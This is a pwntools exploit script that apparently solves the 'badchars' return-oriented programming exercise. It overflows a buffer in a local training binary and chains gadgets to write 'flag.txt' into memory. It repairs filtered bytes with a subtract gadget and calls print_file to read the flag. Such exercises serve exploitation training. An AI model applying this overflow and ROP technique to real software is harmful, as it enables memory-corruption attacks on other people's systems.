from pwn import *

context.binary = './badchars'
#context.log_level = 'debug'

pop_r12_r13_r14_r15 = p64(0x000000000040069c)  # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = p64(0x00000000004006a0) # r15 is the address byte to fix the bad character, and r14 is the value to add.
loc_to_write = p64(0x0000000000601038)  # .bss
mov = p64(0x0000000000400634)  # mov qword ptr [r13], r12 ; ret
print_file = p64(0x400510)
pop_rdi = p64(0x00000000004006a3)
corrupted_char_a = p64(0x60103a)  # purpose:change from 0xeb to 'a' (0x61)-this is because of the badcharacters
corrupted_char_g = p64(0x60103b)
corrupted_char_dot = p64(0x60103c)
corrupted_char_x = p64(0x60103e)
subtract_gadget = p64(0x400630)

payload = [
    b'A'*40,
    pop_r12_r13_r14_r15,
    b'flag.txt',
    loc_to_write,
    p64(0x8a),
    corrupted_char_a,  # offset to change to 'a'
    mov,
    subtract_gadget,  # ***bad character 'a' fixed***

    pop_r14_r15,  # changing r14 and r15 to the next badcharacter accordingly
    p64(0x84),  # offset to change to 'g'
    corrupted_char_g,
    subtract_gadget,  # ***bad character 'g' fixed***

    pop_r14_r15,
    p64(0xbd),  # offset to change to '.'
    corrupted_char_dot,
    subtract_gadget,  # ***bad character '.' fixed***

    pop_r14_r15,
    p64(0x73),  # offset to change to 'x'
    corrupted_char_x,
    subtract_gadget,   # ***bad character 'x' fixed***

    pop_rdi,
    loc_to_write,
    print_file
]

target = process("./badchars")

payload = b''.join(payload)
print(len(payload))

#open('payload', 'w').write(payload)

target.sendline(payload)
target.interactive()